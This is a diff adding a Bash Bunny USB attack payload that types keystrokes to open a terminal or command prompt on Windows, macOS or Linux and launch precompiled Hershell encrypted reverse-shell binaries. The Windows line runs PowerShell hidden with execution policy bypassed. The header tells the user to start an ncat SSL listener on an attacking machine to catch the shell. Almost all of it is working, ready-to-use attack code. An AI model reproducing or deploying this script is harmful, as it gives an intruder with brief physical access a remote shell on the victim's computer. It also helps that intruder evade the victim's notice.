@@ -1,0 +1,118 @@
+#!/bin/bash
+# Title:         Hershell Encrypted Reverse Shell (Cross-platform - Manual Mode)
+# Author:        metalkey
+# Version:       0.5
+# Target:        Windows, Mac OSX, Linux
+# Creds:         Ronan Kervella (Creator of Hershell) - https://github.com/sysdream/hershell
+
+# Instructions:
+# Hershell Github: https://github.com/sysdream/hershell (read all instructions on Hershell git before starting)
+# 1. Compile all payloads and place binaries in the payloads\$SWITCH_POSITION directory (Double check binary names. Defaults are mac32, linux32, win32.exe)
+# 2. Uncomment desired target OS payload lines and ensure others are commented out
+# 3. Start ncat listener on your attacking machine, that is to receive the reverse shell (e.g. ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 4343)
+# 4. Execute attack via Bash Bunny
+
+# SETUP
+DRIVER_LABEL='WINDOWS' # Drive label for your Bash Bunny
+LED R
+GET SWITCH_POSITION # Gets switch position (e.g. switch2)
+ATTACKMODE STORAGE HID SERIAL # Keyboard HID Attack + Storage + Serial
+
+# Modified RUN helper
+function RUN() {
+   local os=$1
+   shift
+   [[ -z "$os" || -z "$*" ]] && exit 1
+   case "$os" in
+      WIN)
+         QUACK GUI m
+         QUACK DELAY 500
+         QUACK GUI r
+         QUACK DELAY 500
+         QUACK STRING cmd.exe
+         QUACK DELAY 100
+         QUACK ENTER
+         QUACK DELAY 500
+         QUACK STRING "$@"
+         QUACK DELAY 100
+         QUACK ENTER
+         ;;
+      OSX)
+         QUACK GUI SPACE
+         QUACK DELAY 100
+         QUACK STRING terminal
+         QUACK DELAY 100
+         QUACK ENTER
+         QUACK GUI t
+         QUACK DELAY 100
+         QUACK STRING /bin/bash
+         QUACK DELAY 100
+         QUACK ENTER
+         QUACK STRING "$@"
+         QUACK DELAY 100
+         QUACK ENTER
+         QUACK DELAY 100
+         QUACK STRING "exit"
+         QUACK DELAY 100
+         QUACK ENTER
+         QUACK DELAY 100
+         QUACK STRING "exit"
+         QUACK DELAY 100
+         QUACK ENTER
+         ;;
+      UNITY)
+         QUACK ALT F2
+         QUACK DELAY 1000
+         QUACK STRING xterm
+         QUACK DELAY 1000
+         QUACK ENTER
+         QUACK DELAY 1000
+         QUACK STRING /bin/bash
+         QUACK DELAY 1000
+         QUACK ENTER
+         QUACK DELAY 500
+         QUACK STRING cd /media/'$USER'
+         QUACK DELAY 500
+         QUACK ENTER
+         QUACK DELAY 500
+         QUACK STRING "$@"
+         QUACK DELAY 500
+         QUACK ENTER
+         QUACK DELAY 500
+         QUACK STRING "exit"
+         QUACK DELAY 500
+         QUACK ENTER
+         QUACK DELAY 500
+         QUACK STRING "exit"
+         QUACK DELAY 500
+         QUACK ENTER
+         ;;
+      *)
+         exit 1
+         ;;
+   esac
+}
+export -f RUN
+
+# START Attack
+LED Y
+
+# [+] Mac - Uncomment the following lines to use:
+# until ls -halt /dev | head -n 5 | grep -q "nandf"; do sleep 1; done # Wait for bb to mount
+# LED Y FAST
+# RUN OSX "cp /Volumes/$DRIVER_LABEL/payloads/$SWITCH_POSITION/mac32 /tmp && chmod +x /tmp/mac32 && /tmp/mac32 &"
+
+# [+] Linux - Uncomment the following lines to use:
+until dmesg | grep -q "sunxi_usb"; do sleep 1; done; sleep 5 # Wait for bb to mount
+LED Y FAST
+RUN UNITY "cd $DRIVER_LABEL/payloads/$SWITCH_POSITION && cp linux32 /tmp/ && chmod +x /tmp/linux32 && /tmp/linux32 &"
+
+# [+] Windows - Uncomment the following lines to use:
+# until dmesg | grep -q "sunxi_usb"; do sleep 1; done; sleep 5 # Wait for bb to mount
+# LED Y FAST
+# RUN WIN powershell -NoP -NonI -W Hidden -exec bypass ".((gwmi win32_volume -f 'label=''$DRIVER_LABEL''').Name+'\payloads\\$SWITCH_POSITION\win32.exe')"
+
+# END
+sleep 5
+LED G
+# shutdown 0 # LIGHTS OUT = Shutdown and dismount (if desired)
